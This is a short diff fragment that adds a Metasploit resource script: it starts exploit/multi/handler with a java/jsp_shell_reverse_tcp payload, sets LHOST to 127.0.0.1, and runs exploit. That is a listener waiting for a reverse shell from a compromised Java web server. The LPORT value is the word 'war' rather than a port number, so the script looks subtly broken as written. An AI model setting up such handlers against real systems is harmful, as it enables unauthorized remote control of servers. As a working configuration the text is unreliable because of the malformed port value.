@@ -1,0 +1,7 @@
+
+		use exploit/multi/handler
+		set PAYLOAD java/jsp_shell_reverse_tcp
+		set LHOST 127.0.0.1
+		set LPORT war
+		exploit
+		
